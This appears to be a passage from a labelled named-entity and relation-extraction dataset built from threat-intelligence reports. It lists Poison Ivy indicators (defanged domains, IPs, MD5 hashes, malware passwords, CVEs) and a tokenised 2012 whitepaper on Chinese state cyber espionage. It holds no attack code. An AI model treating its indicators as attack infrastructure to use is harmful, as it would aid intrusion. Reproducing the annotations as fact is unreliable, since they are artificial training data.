"no-ip[.]org"], ["T113", "Time", "6681", "6691", "2014-02-12"], ["T114", "Address", "6692", "6705", "74", ".", "126.177.70"], ["T115", "Indicator", "6706", "6728", "microsafes", ".", "no-ip[.]org"], ["T116", "Time", "6729", "6739", "2013-12-04"], ["T117", "Time", "6740", "6750", "2013-12-04"], ["T118", "Address", "6751", "6765", "74", ".", "126.177.241"], ["T119", "Malware", "6771", "6781", "Poison", "Ivy"], ["T120", "Indicator", "6813", "6833", "domain", "wmi", ".", "ns01[.]us"], ["R26", "indicates", "Arg1:T120", "Arg2:T119"], ["T121", "MD5", "6430", "6462", "88b375e3b5c50a3e6c881bc96c926928"], ["T122", "MD5", "6489", "6521", "cd07a9e49b1f909e1bd9e39a7a6e56b4"], ["R27", "indicates", "Arg1:T121", "Arg2:T98"], ["R28", "hasAttackTime", "Arg1:T98", "Arg2:T105"], ["R29", "hasAttackTime", "Arg1:T97", "Arg2:T104"], ["R30", "indicates", "Arg1:T94", "Arg2:T97"], ["R31", "indicates", "Arg1:T122", "Arg2:T99"], ["R32", "hasAttackTime", "Arg1:T99", "Arg2:T106"], ["R33", "indicates", "Arg1:T92", "Arg2:T95"], ["R34", "hasAttackTime", "Arg1:T95", "Arg2:T103"], ["R35", "indicates", "Arg1:T100", "Arg2:T95"], ["R36", "indicates", "Arg1:T93", "Arg2:T96"], ["R37", "indicates", "Arg1:T101", "Arg2:T96"], ["R38", "hasAttackTime", "Arg1:T96", "Arg2:T102"], ["T123", "MD5", "6898", "6930", "fd69793bd63c44bbb22f9c4d46873252"], ["T124", "MD5", "6937", "6969", "88b375e3b5c50a3e6c881bc96c926928"], ["T125", "MD5", "6976", "7008", "cd07a9e49b1f909e1bd9e39a7a6e56b4"], ["T126", "Password", "6931", "6936", "java7"], ["T127", "Password", "6970", "6975", "admin"], ["T128", "Password", "7009", "7014", "admin"], ["R39", "indicates", "Arg1:T123", "Arg2:T119"], ["R40", "indicates", "Arg1:T124", "Arg2:T119"], ["R41", "indicates", "Arg1:T125", "Arg2:T119"], ["T129", "MD5", "7095", "7127", "8936c87a08ffa56d19fdb87588e35952"], ["T130", "Malware", "7072", "7082", "Poison", "Ivy"], ["R42", "indicates", "Arg1:T129", "Arg2:T130"], ["T131", "Password", "7144", "7149", "java7"], ["T132", "Software", "7185", "7196", "Adobe", "Flash"], ["T133", "Vulnerability", "7206", "7219", "CVE-2012-0779"], ["R43", "hasVulnerability", "Arg1:T132", "Arg2:T133"], ["R44", "exploits", "Arg1:T130", "Arg2:T133"], ["T134", "ExploitTargetObject", "7265", "7295", "Center", "for", "Defense", "Information"], ["T135", "ExploitTargetObject", "7305", "7318", "www", ".", "cdi[.]org"], ["T136", "Address", "7412", "7424", "159", ".", "54.62.92"], ["T137", "File", "7480", "7495", "BrightBalls", ".", "swf"], ["T138", "MD5", "7527", "7528", "1"], ["R45", "indicates", "Arg1:T137", "Arg2:T130"], ["R46", "indicates", "Arg1:T138", "Arg2:T130"], ["T139", "Malware", "7571", "7581", "Poison", "Ivy"], ["T140", "Password", "7631", "7636", "java7"], ["T141", "Indicator", "7711", "7720", "YFds*&^ff"], ["T142", "Indicator", "7755", "7772", "windows", ".", "ddns[.]us"], ["T143", "Indicator", "7821", "7838", "windows", ".", "ddns[.]us"], ["T144", "Indicator", "7843", "7856", "wmi", ".", "ns01[.]us"], ["T145", "Address", "7874", "7886", "76", ".", "73.80.188"], ["T146", "Time", "7890", "7898", "mid-2012"], ["R47", "indicates", "Arg1:T141", "Arg2:T139"], ["R48", "indicates", "Arg1:T142", "Arg2:T139"], ["R49", "indicates", "Arg1:T143", "Arg2:T139"], ["R50", "indicates", "Arg1:T144", "Arg2:T139"], ["R51", "hasAttackTime", "Arg1:T139", "Arg2:T146"], ["R52", "usesAddress", "Arg1:T139", "Arg2:T145"], ["T147", "Indicator", "7907", "7918", "wmi", ".", "ns01.us"], ["T148", "Indicator", "7919", "7934", "windows", ".", "ddns.us"], ["T149", "Time", "7947", "7957", "2012-07-07"], ["T150", "Time", "7958", "7968", "2012-05-23"], ["T151", "Time", "7980", "7990", "2012-09-19"], ["T152", "Time", "7991", "8001", "2012-06-10"], ["T153", "Address", "8014", "8026", "76", ".", "73.80.188"], ["T154", "MD5", "8166", "8198", "7d810e3564c4eb95bcb3d11ce191208e"], ["T155", "Vulnerability", "8225", "8238", "CVE-2012-0507"], ["T156", "MD5", "8291", "8323", "52aa791a524b61b129344f10b4712f52"], ["T157", "Malware", "8253", "8263", "Poison", "Ivy"], ["R53", "exploits", "Arg1:T157", "Arg2:T155"], ["R54", "indicates", "Arg1:T154", "Arg2:T157"], ["R55", "indicates", "Arg1:T156", "Arg2:T157"], ["T158", "Malware", "8331", "8341", "Poison", "Ivy"], ["T159", "Indicator", "8379", "8392", "ids", ".", "ns01[.]us"], ["T160", "Indicator", "8405", "8418", "ids", ".", "ns01[.]us"], ["R56", "indicates", "Arg1:T160", "Arg2:T158"], ["R57", "indicates", "Arg1:T159", "Arg2:T158"], ["T161", "Indicator", "8449", "8462", "wmi", ".", "ns01[.]us"], ["T162", "Address", "8473", "8487", "194", ".", "183.224.75"], ["T163", "Indicator", "8496", "8509", "wmi", ".", "ns01[.]us"], ["T164", "Indicator", "8510", "8523", "ids", ".", "ns01[.]us"], ["T165", "Time", "8536", "8546", "2012-07-03"], ["T166", "Time", "8547", "8557", "2012-04-23"], ["T167", "Time", "8569", "8579", "2012-07-04"], ["T168", "Time", "8580", "8590", "2012-05-18"], ["T169", "Address", "8603", "8617", "194", ".", "183.224.75"], ["T170", "Address", "8618", "8632", "194", ".", "183.224.75"], ["T171", "MD5", "8678", "8710", "fd69793bd63c44bbb22f9c4d46873252"], ["T172", "ExploitTargetObject", "8783", "8817", "Center", "for", "European", "Policy", "Studies"], ["T173", "Malware", "8638", "8648", "Poison", "Ivy"], ["T174", "ExploitTargetObject", "8819", "8832", "www", ".", "ceps[.]be"], ["T175", "ExploitTargetObject", "8879", "8892", "www", ".", "ceps[.]be"], ["T176", "Indicator", "8921", "8939", "shop", ".", "fujifilm[.]be"], ["R58", "indicates", "Arg1:T176", "Arg2:T173"], ["R59", "indicates", "Arg1:T171", "Arg2:T173"], ["T177", "ExploitTargetObject", "8998", "9012", "www", ".", "arce[.]org"], ["R60", "usesAddress", "Arg1:T95", "Arg2:T110"], ["R61", "usesAddress", "Arg1:T95", "Arg2:T114"], ["R62", "usesAddress", "Arg1:T96", "Arg2:T118"]]}], [{"vertexSet": [{"old_id": "T1", "type": "ThreatActor", "name": "Chinese government", "sent_id": 121, "pos": [8, 9]}, {"old_id": "T2", "type": "Country", "name": "China", "sent_id": 128, "pos": [3]}, {"old_id": "T3", "type": "Exploit", "name": "zero day", "sent_id": 141, "pos": [12, 13]}, {"old_id": "T4", "type": "FinancialInformation", "name": "economics", "sent_id": 161, "pos": [9]}, {"old_id": "T5", "type": "Information", "name": "trade and human rights", "sent_id": 161, "pos": []}, {"old_id": "T6", "type": "ExploitTargetObject", "name": "government departments", "sent_id": 162, "pos": [5, 6]}, {"old_id": "T7", "type": "ExploitTargetObject", "name": "embassies", "sent_id": 162, "pos": [8]}, {"old_id": "T8", "type": "ExploitTargetObject", "name": "NGOs", "sent_id": 162, "pos": [13]}, {"old_id": "T9", "type": "ExploitTargetObject", "name": "UN", "sent_id": 163, "pos": [7]}, {"old_id": "T10", "type": "ExploitTargetObject", "name": "G20", "sent_id": 163, "pos": [9]}, {"old_id": "T11", "type": "ExploitTargetObject", "name": "World Bank", "sent_id": 163, "pos": [11, 12]}, {"old_id": "T12", "type": "ExploitTargetObject", "name": "IMF", "sent_id": 163, "pos": [14]}, {"old_id": "T13", "type": "Organization", "name": "Centre for the Protection of National Infrastructure", "sent_id": 179, "pos": []}, {"old_id": "T14", "type": "Organization", "name": "FBI", "sent_id": 180, "pos": []}, {"old_id": "T15", "type": "CourseOfAction", "name": "anti-virus", "sent_id": 204, "pos": [3]}, {"old_id": "T16", "type": "CourseOfAction", "name": "firewalls", "sent_id": 204, "pos": [5]}, {"old_id": "T17", "type": "CourseOfAction", "name": "penetration testing", "sent_id": 207, "pos": [5, 6]}, {"old_id": "T18", "type": "File", "name": "Adobe PDF", "sent_id": 253, "pos": [1, 2]}, {"old_id": "T19", "type": "File", "name": "Microsoft Office document", "sent_id": 253, "pos": []}, {"old_id": "T20", "type": "Software", "name": "Internet Explorer", "sent_id": 257, "pos": [1, 2]}, {"old_id": "T21", "type": "Software", "name": "Firefox", "sent_id": 257, "pos": [4]}, {"old_id": "T22", "type": "Country", "name": "Japan", "sent_id": 275, "pos": [2]}, {"old_id": "T23", "type": "Country", "name": "Taiwan", "sent_id": 275, "pos": [4]}, {"old_id": "T24", "type": "Country", "name": "Tibet", "sent_id": 275, "pos": [9]}, {"old_id": "T25", "type": "Country", "name": "Mongolia", "sent_id": 275, "pos": [11]}, {"old_id": "T26", "type": "Country", "name": "US", "sent_id": 277, "pos": [0]}, {"old_id": "T27", "type": "Country", "name": "Russia", "sent_id": 277, "pos": [2]}, {"old_id": "T28", "type": "Country", "name": "UK", "sent_id": 277, "pos": [5]}, {"old_id": "T29", "type": "Country", "name": "Germany", "sent_id": 277, "pos": [7]}, {"old_id": "T30", "type": "Country", "name": "France", "sent_id": 277, "pos": [9]}, {"old_id": "T31", "type": "Country", "name": "India", "sent_id": 277, "pos": []}, {"old_id": "T32", "type": "Attacker", "name": "China", "sent_id": 272, "pos": [11]}, {"old_id": "T33", "type": "Attacker", "name": "China", "sent_id": 278, "pos": [1]}, {"old_id": "T34", "type": "Country", "name": "Brazil", "sent_id": 278, "pos": [3]}, {"old_id": "T35", "type": "Country", "name": "Iran", "sent_id": 278, "pos": [5]}, {"old_id": "T36", "type": "Location", "name": "Australia", "sent_id": 278, "pos": [7]}, {"old_id": "T37", "type": "ExploitTargetObject", "name": "separatist Uighurs", "sent_id": 286, "pos": [2, 3]}, {"old_id": "T38", "type": "ExploitTargetObject", "name": "Tibetan separatists", "sent_id": 286, "pos": []}, {"old_id": "T39", "type": "ExploitTargetObject", "name": "pro-democracy supporters", "sent_id": 287, "pos": [2, 3]}, {"old_id": "T40", "type": "ExploitTargetObject", "name": "supporters of an independent Taiwan", "sent_id": 287, "pos": [3, 9]}, {"old_id": "T41", "type": "ExploitTargetObject", "name": "Falun Gong", "sent_id": 288, "pos": [4, 5]}, {"old_id": "T42", "type": "Exploit", "name": "passive email attacks", "sent_id": 305, "pos": [9, 11]}, {"old_id": "T43", "type": "Attacker", "name": "China", "sent_id": 303, "pos": [0]}, {"old_id": "T44", "type": "Campaign", "name": "Aurora", "sent_id": 313, "pos": []}, {"old_id": "T45", "type": "Organization", "name": "Google", "sent_id": 313, "pos": [11]}, {"old_id": "T46", "type": "Organization", "name": "Adobe", "sent_id": 313, "pos": [13]}, {"old_id": "T47", "type": "Organization", "name": "Juniper", "sent_id": 313, "pos": [15]}, {"old_id": "T48", "type": "Organization", "name": "Northrup Grumman", "sent_id": 313, "pos": []}, {"old_id": "T49", "type": "Campaign", "name": "Night Dragon", "sent_id": 314, "pos": []}, {"old_id": "T50", "type": "ExploitTargetObject", "name": "energy sector", "sent_id": 315, "pos": []}, {"old_id": "T51", "type": "Campaign", "name": "Shady RAT", "sent_id": 315, "pos": []}, {"old_id": "T52", "type": "ExploitTargetObject", "name": "steel industry", "sent_id": 315, "pos": []}, {"old_id": "T53", "type": "ExploitTargetObject", "name": "heavy engineering", "sent_id": 316, "pos": [2, 3]}, {"old_id": "T54", "type": "ExploitTargetObject", "name": "construction", "sent_id": 316, "pos": [5]}, {"old_id": "T55", "type": "ExploitTargetObject", "name": "communications companies", "sent_id": 316, "pos": [7, 8]}, {"old_id": "T56", "type": "ExploitTargetObject", "name": "RSA", "sent_id": 320, "pos": []}, {"old_id": "T57", "type": "AccountAuthenticationInformation", "name": "SecurID tokens", "sent_id": 321, "pos": [9, 10]}, {"old_id": "T58", "type": "Organization", "name": "Lockheed Martin", "sent_id": 325, "pos": [5, 6]}, {"old_id": "T59", "type": "Attacker", "name": "People\u2019s Liberation Army", "sent_id": 377, "pos": [7, 9]}, {"old_id": "T60", "type": "ExploitTargetObject", "name": "Pentagon", "sent_id": 383, "pos": [16]}, {"old_id": "T61", "type": "Malware", "name": "Stuxnet", "sent_id": 397, "pos": []}, {"old_id": "T62", "type": "MalwareFamily", "name": "Five Poisons", "sent_id": 558, "pos": [2, 3]}, {"old_id": "T63", "type": "AttackerGroup", "name": "3PLA", "sent_id": 685, "pos": []}, {"old_id": "T64", "type": "Organization", "name": "COMAC", "sent_id": 785, "pos": [0]}, {"old_id": "T65", "type": "Organization", "name": "Commercial Aircraft Corporation of China", "sent_id": 784, "pos": [11, 15]}, {"old_id": "T66", "type": "Organization", "name": "Parker Aerospace", "sent_id": 796, "pos": []}, {"old_id": "T67", "type": "Organization", "name": "General Electric", "sent_id": 797, "pos": [2, 3]}, {"old_id": "T68", "type": "Organization", "name": "Honeywell", "sent_id": 797, "pos": [5]}, {"old_id": "T69", "type": "Organization", "name": "Goodrich", "sent_id": 797, "pos": [7]}, {"old_id": "T70", "type": "TechnologyInformation", "name": "designs for the body of the aircraft", "sent_id": 838, "pos": [1, 7]}, {"old_id": "T71", "type": "TechnologyInformation", "name": "aerodynamic information", "sent_id": 838, "pos": [13, 14]}, {"old_id": "T72", "type": "TechnologyInformation", "name": "engine designs", "sent_id": 839, "pos": [14, 15]}], "labels": [{"old_id": "R1", "r": "P32", "h": 31, "t": 21, "evidence": [272, 273, 274, 275]}, {"old_id": "R2", "r": "P32", "h": 31, "t": 22, "evidence": [272, 273, 274, 275]}, {"old_id": "R3", "r": "P32", "h": 31, "t": 23, "evidence": [272, 273, 274, 275]}, {"old_id": "R4", "r": "P32", "h": 31, "t": 24, "evidence": [272, 273, 274, 275]}, {"old_id": "R5", "r": "P32", "h": 31, "t": 25, "evidence": [272, 273, 274, 275, 276, 277]}, {"old_id": "R6", "r": "P32", "h": 31, "t": 26, "evidence": [272, 273, 274, 275, 276, 277]}, {"old_id": "R7", "r": "P32", "h": 31, "t": 27, "evidence": [272, 273, 274, 275, 276, 277]}, {"old_id": "R8", "r": "P32", "h": 32, "t": 28, "evidence": []}, {"old_id": "R9", "r": "P32", "h": 32, "t": 29, "evidence": []}, {"old_id": "R10", "r": "P32", "h": 32, "t": 30, "evidence": []}, {"old_id": "R11", "r": "P32", "h": 32, "t": 35, "evidence": [278]}, {"old_id": "R12", "r": "P32", "h": 32, "t": 33, "evidence": [278]}, {"old_id": "R13", "r": "P32", "h": 32, "t": 34, "evidence": [278]}, {"old_id": "R14", "r": "P23", "h": 42, "t": 41, "evidence": [303, 304, 305]}, {"old_id": "R15", "r": "P27", "h": 43, "t": 44, "evidence": [313]}, {"old_id": "R16", "r": "P27", "h": 43, "t": 45, "evidence": [313]}, {"old_id": "R17", "r": "P27", "h": 43, "t": 46, "evidence": [313]}, {"old_id": "R18", "r": "P27", "h": 43, "t": 47, "evidence": [313]}, {"old_id": "R19", "r": "P27", "h": 48, "t": 49, "evidence": [314, 315]}, {"old_id": "R20", "r": "P27", "h": 50, "t": 51, "evidence": [315]}, {"old_id": "R21", "r": "P27", "h": 50, "t": 52, "evidence": [315, 316]}, {"old_id": "R22", "r": "P27", "h": 50, "t": 53, "evidence": [315, 316]}, {"old_id": "R23", "r": "P27", "h": 50, "t": 54, "evidence": [315, 316]}], "title": ["inputs/txt/201203ContextInformationSecurityCrouchingTiger"], "sents": [["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["Crouching", "Tiger", ","], ["Hidden", "Dragon", ","], ["Stolen", "Data"], ["Context", "Information", "Security"], ["whitepapers@contextis", ".", "com"], ["March", "2012"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["1", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["Contents"], ["Executive", "Summary"], ["3"], ["Introduction"], ["4"], ["Categorising", "Attacks"], ["5"], ["Why", "Cyber", "?"], ["6"], ["How", "Cyber", "?"], ["7"], ["The", "Targets"], ["7"], ["The", "Requirements"], ["9"], ["Boosting", "Domestic", "Enterprise"], ["11"], ["At", "Risk"], ["12"], ["How", "Does", "it", "Happen", "?"], ["14"], ["Setting", "Requirements"], ["14"], ["Planning", "and", "Direction"], ["15"], ["Collection"], ["15"], ["Processing", "and", "Exploitation"], ["15"], ["Analysis", "and", "Production"], ["15"], ["Dissemination"], ["16"], ["The", "Scale", "of", "the", "Operation"], ["17"], ["Profiting", "from", "the", "Product"], ["18"], ["Hypothetical", "Case", "Study:", "Aircraft", "Construction"], ["19"], ["Conclusion"], ["21"], ["About", "Context"], ["23"], ["Appendix"], ["24"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["2", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["Executive", "Summary"], ["Media", "reports", "show", "that", "targeted", "cyber", "attacks", "against", "government", "and", "commerce", "have"], ["been", "ongoing", "since", "at", "least", "2003", "and", "possibly", "some", "time", "before", "that", ".", "By", "far", "the", "largest"], ["sponsor", "of", "these", "attacks", "is", "the", "Chinese", "state", ".", "This", "is", "not", "a", "new", "problem;", "it", "is", "espionage", "with", "a"], ["different", "methodology", "."], ["These", "attacks", "are", "far", "from", "random", "or", "indiscriminate", ".", "These", "attacks", "are", "designed", "to", "steal"], ["information", "that", "will", "fulfil", "a", "clear", "set", "of", "requirements", "set", "by", "the", "Chinese", "state", "and", "furnish"], ["them", "with", "political", ",", "commercial", "and", "security/intelligence", "information", ".", "These", "requirements"], ["are", "carefully", "and", "clearly", "identified", ",", "shared", "with", "a", "number", "of", "government", "departments", "and"], ["constantly", "updated", ".", "There", "is", "evidence", "of", "worldwide", "targeting", "but", "only", "a", "minority", "of", "attacks"], ["are", "identified", "and", "fewer", "still", "made", "public", "."], ["This", "is", "a", "structured", "program", "and", "the", "main", "protagonists", "in", "China", "are", "widely", "believed", "to", "be"], ["the", "Third", "Department", "of", "the", "People\u2019s", "Liberation", "Army", ".", "Even", "using", "conservative", "estimates", "it", "is"], ["likely", "that", "the", "program", "employs", "thousands", "of", "military", "personnel", ".", "While", "the", "military", "program"], ["may", "be", "the", "most", "developed", "and", "sophisticated", ",", "it", "is", "likely", "that", "other", "parts", "of", "the", "Chinese"], ["state", "and", "even", "the", "private", "sector", "may", "also", "be", "carrying", "out", "similar", "attacks", "."], ["There", "are", "clues", "to", "the", "companies", "and", "types", "of", "data", "most", "at", "risk", ".", "In", "particular", "the", "Five", "Year"], ["Plan1", "and", "the", "National", "Outline", "for", "Medium", "and", "Long", "Term", "S&T", "Development2", "give", "detail", "on"], ["the", "areas", "in", "which", "China", "intends", "to", "excel", "and", "identifies", "specific", "technology", "which", "the"], ["Chinese", "want", "to", "develop", "or", "otherwise", "acquire", ".", "Electronics", ",", "telecoms", ",", "manufacturing", ","], ["extraction", ",", "energy", ",", "biotech", ",", "pharmaceuticals", ",", "aerospace", ",", "space", "and", "defence", "are", "sectors"], ["at", "the", "highest", "risk", ",", "alongside", "companies", "and", "services", "such", "as", "law", "and", "accountancy", "firms"], ["that", "support", "them", "and", "hold", "their", "data", "."], ["The", "likely", "recipients", "of", "stolen", "commercial", "data", "are", "the", "117", "Chinese", "State", "Owned", "Enterprises"], ["that", "dominate", "the", "economy", ".", "These", "companies", "are", "closely", "linked", "to", "the", "state", "and", "the"], ["Communist", "Party", "which", "has", "power", "over", "strategy", ",", "senior", "management", "and", "even", "wages", "."], ["Companies", "with", "SOE", "competitors", "should", "be", "especially", "concerned", "about", "data", "security", "."], ["Two", "factors", "make", "western", "governments", "and", "companies", "more", "vulnerable", "to", "Chinese"], ["targeted", "cyber", "attacks", ".", "Firstly", ",", "there", "is", "reluctance", "for", "governments", "and", "companies", "to"], ["accuse", "China", "directly", "or", "take", "any", "form", "of", "action", "for", "fear", "of", "either", "being", "isolated", "politically"], ["or", "being", "blocked", "from", "a", "lucrative", "developing", "market", ".", "Secondly", ",", "a", "long", "term", "reliance", "on"], ["traditional", "security", "products", "such", "as", "anti-virus", ",", "coupled", "with", "a", "lack", "of", "education", "about", "the"], ["threat", ",", "leaves", "businesses", "vulnerable", "to", "attack", "and", "unprepared", "for", "any", "investigations", "that"], ["are", "required", "in", "the", "aftermath", "of", "a", "compromise", "."], ["Context", "has", "extensive", "experience", "of", "detecting", "and", "investigating", "targeted", "attacks", "and"], ["working", "with", "clients", "to", "help", "protect", "their", "data", "."], ["1"], ["Chinese", "Government", "Official", "Web", "Portal", "website"], ["2"], ["China", "International", "Science", "and", "Technology", "Cooperation", "website"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["3", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["Introduction"], ["There", "have", "been", "many", "media", "reports", "in", "recent", "years", "about", "cyber", "attacks", "on", "governments"], ["and", "a", "variety", "of", "private", "sector", "companies", ".", "The", "rather", "ambiguous", "term", "\u2018Advanced", "Persistent"], ["Threat\u20193", "(\u2018APT\u2019)", "is", "widely", "used", "to", "describe", "any", "attack", "that", "appears", "to", "have", "compromised"], ["computers", "in", "these", "companies", "or", "organisations", ",", "regardless", "of", "the", "source", "or", "purpose", "of", "the"], ["attack", ".", "We", "prefer", "simply", "to", "call", "them", "\u2018targeted", "attacks\u2019", "and", "leave", "marketing", "terms", "to", "one"], ["side", ".", "This", "paper", "is", "not", "concerned", "with", "the", "technical", "aspects", "of", "targeted", "attacks", ",", "it", "seeks"], ["instead", "to", "inform", "readers", "about", "the", "full", "scope", "and", "nature", "of", "these", "attacks", ",", "the", "reasons", "why"], ["they", "are", "launched", "and", "the", "people", "and", "policies", "behind", "their", "design", "and", "execution", "."], ["Many", "reports", "of", "attacks", "inevitably", "end", "by", "asking", "\u2018who", "did", "it", "?", "\u2019", "But", "the", "answer", "is", "rarely"], ["straightforward", ".", "Western", "Governments", "usually", "allege", "the", "attacks", "come", "from", "\u2018Asia\u2019", "or", "the"], ["\u2018Far", "East\u2019", ",", "rather", "than", "risk", "offending", "the", "Chinese", "government", ".", "Large", "corporations", "are"], ["similarly", "vague", "in", "their", "descriptions", "of", "these", "events", ",", "for", "fear", "of", "harming", "lucrative", "business"], ["arrangements", ".", "Security", "\u2018experts\u2019", "always", "caution", "that", "IP", "addresses", "can", "be", "used", "as", "hop"], ["points", "through", "which", "attackers", "disguise", "their", "true", "origins", ",", "so", "perhaps", "this", "could", "be", "a", "case", "of"], ["other", "countries", "trying", "to", "make", "it", "look", "as", "if", "China", "was", "the", "source", ".", "While", "this", "is", "true", ",", "if"], ["something", "looks", ",", "walks", "and", "quacks", "like", "a", "duck", ",", "it", "is", "almost", "always", "a", "duck", "."], ["We", "will", "not", "be", "so", "coy", ".", "This", "paper", "will", "look", "directly", "at", "the", "most", "prolific", "sponsor", "of", "computer"], ["network", "exploitation", "attacks:", "China", ".", "We", "know", "other", "countries", "have", "implemented", "similar"], ["programs", "for", "attacking", "computer", "networks", "and", "have", "seen", "many", "examples", "of", "these", "in", "our"], ["work", "over", "the", "last", "few", "years", ",", "but", "our", "focus", "here", "is", "China", "."], ["We", "will", "examine", "various", "aspects", "of", "these", "attacks", ",", "including", "the", "nature", "of", "the", "information"], ["targeted", "and", "the", "types", "of", "organisations", "threatened", ".", "We", "will", "consider", "the", "effort", "involved", "in"], ["planning", ",", "executing", "and", "managing", "these", "attacks;", "and", "assess", "the", "information", "products", "they"], ["generate", ",", "in", "order", "to", "understand", "the", "scale", "of", "human", "involvement", "and", "the", "government"], ["policies", "that", "sponsor", "information", "theft", "via", "targeted", "attacks", ".", "With", "all", "this", "in", "mind", "we", "will", "then"], ["postulate", "on", "where", "the", "stolen", "information", "goes", "and", "how", "it", "may", "be", "used", "."], ["Advanced", "Persistent", "Threat", "has", "recently", "become", "a", "catch", "all", "term", "for", "targeted", "attacks"], ["against", "computer", "networks", "and", "is", "often", "used", "to", "describe", "the", "malware", ".", "In", "fact", ",", "the", "term", "was"], ["first", "coined", "by", "the", "United", "States", "Air", "Force", "in", "2006", ",", "specifically", "to", "refer", "to", "China", "\u2013", "without"], ["actually", "saying", "China", ".", "\u2018Advanced\u2019", "because", "the", "attackers", "could", "use", "a", "variety", "of", "attacks", "to"], ["get", "access", "to", "a", "network", "and", "could", "raise", "their", "game", "to", "use", "zero", "day", "vulnerabilities", "if"], ["necessary;", "\u2018Persistent\u2019", "because", "the", "attacks", "would", "not", "stop", "until", "the", "attacker", "had", "achieved"], ["their", "objectives;", "and", "\u2018Threat\u2019", "because", "this", "attack", "was", "not", "automated", "like", "a", "botnet", ",", "but", "was"], ["conducted", "by", "humans", "who", "adapt", "and", "evolve", "their", "methods", "to", "evade", "defences", "."], ["3"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["4", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["Categorising", "Attacks"], ["Many", "commentators", "have", "divided", "the", "targets", "of", "attacks", "into", "four", "categories:", "political", ","], ["economic", ",", "technical", "and", "military", ".", "This", "works", "as", "a", "general", "model", ",", "but", "focuses", "on", "the", "target"], ["of", "the", "attack", "as", "a", "whole", "rather", "than", "considering", "the", "type", "of", "information", "the", "attacker", "seeks"], ["to", "steal", ".", "If", "a", "criminal", "gang", "unleashes", "a", "phishing", "attack", "aimed", "at", "harvesting", "banking"], ["credentials", "and", "it", "is", "the", "employees", "of", "a", "butchers", "shop", "and", "a", "bakery", "that", "fall", "victim", "to", "it", ",", "that"], ["does", "not", "mean", "the", "attack", "was", "targeting", "bread", "and", "meat", "."], ["Bearing", "this", "in", "mind", ",", "we", "divide", "target", "areas", "into", "the", "following", "categories:"], ["Political", ".", "The", "information", "targeted", "will", "inform", "the", "state", "on", "the", "political", "positions", "of"], ["other", "governments", "on", "a", "range", "of", "issues", ",", "including", "economics", ",", "trade", "and", "human"], ["rights", ".", "Typical", "targets", "are", "government", "departments", ",", "embassies", ",", "trade", "bodies", ",", "NGOs", ","], ["and", "international", "political", "groups", "such", "as", "the", "UN", ",", "G20", ",", "World", "Bank", "and", "IMF", "."], ["Commercial", ".", "The", "information", "targeted", "will", "be", "of", "value", "to", "the", "private", "sector", "within"], ["that", "country", "(even", "if", "the", "lines", "between", "private", "and", "public", "sectors", "are", "blurred)", ".", "It", "may"], ["include", "IPR", ",", "product", "designs", ",", "negotiating", "positions", "for", "sales", "discussions", ",", "mergers", "and"], ["acquisitions", "information", "and", "strategic", "plans", "(particularly", "in", "relation", "to", "the", "attacking"], ["country)", "."], ["Intelligence", ".", "The", "information", "targeted", "here", "will", "be", "used", "to", "safeguard", "internal", "security"], ["by", "the", "attacker", "country", "(this", "may", "entail", "intimidation", "or", "close", "monitoring", "of", "minority", "or"], ["opposition", "groups", "or", "individuals)", "and", "to", "enable", "analysis", "of", "the", "military", "technology", ","], ["capabilities", "and", "intentions", "of", "other", "countries", "."], ["There", "are", "a", "number", "of", "major", "problems", "that", "need", "to", "be", "overcome", "when", "seeking", "a"], ["complete", "understanding", "of", "the", "scale", "and", "purpose", "of", "attacks", ".", "Many", "will", "never", "be", "detected", ","], ["those", "that", "are", "may", "not", "always", "be", "reported;", "and", "the", "vast", "majority", "are", "not", "investigated", "by"], ["professionals", "with", "a", "good", "understanding", "of", "these", "types", "of", "attack", ".", "Dealing", "with", "the", "technical"], ["aspects", "of", "the", "compromise", "alone", "is", "not", "enough:", "the", "victim", "needs", "to", "know", "why", "they", "were"], ["being", "attacked", ",", "by", "whom", ",", "what", "data", "was", "stolen", "and", "where", "it", "may", "go", "."], ["While", "government", "agencies", ",", "such", "as", "the", "Centre", "for", "the", "Protection", "of", "National", "Infrastructure4"], ["(CPNI)", "in", "the", "UK", "and", "the", "FBI5", "in", "the", "US", ",", "are", "working", "successfully", "with", "larger", "organisations", "to"], ["identify", "potential", "threats", ",", "reduce", "the", "risk", "of", "successful", "attacks", "and", "in", "some", "cases", "to", "identify"], ["and", "investigate", "specific", "compromises", ",", "this", "assistance", "is", "not", "available", "to", "every", "company", ".", "It", "is"], ["not", "generally", "available", "to", "those", "that", "need", "it", "the", "most", "\u2013", "companies", "that", "innovate", "and", "excel"], ["in", "niche", "areas", "and", "supply", "technology", "or", "products", "that", "other", "companies", "make", "use", "of", "in"], ["larger", "projects", ".", "These", "companies", "live", "and", "die", "by", "the", "success", "of", "their", "research", "and"], ["development", ",", "but", "often", "lack", "the", "budgetary", "resources", "or", "expertise", "required", "to", "adequately"], ["protect", "their", "networks", "from", "this", "type", "of", "threat", "."], ["Even", "when", "compromises", "are", "investigated", "by", "companies", "that", "understand", "the", "attackers", "and"], ["their", "motives", ",", "it", "is", "often", "not", "felt", "to", "be", "in", "the", "interests", "of", "either", "party", "to", "publish", "the", "findings", "of"], ["those", "investigations", ",", "or", "to", "share", "the", "results", "with", "the", "affected", "company\u2019s", "competitors", ",", "who"], ["4"], ["http://www", ".", "cpni.gov.uk"], ["5"], ["http://www", ".", "fbi.gov/"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", 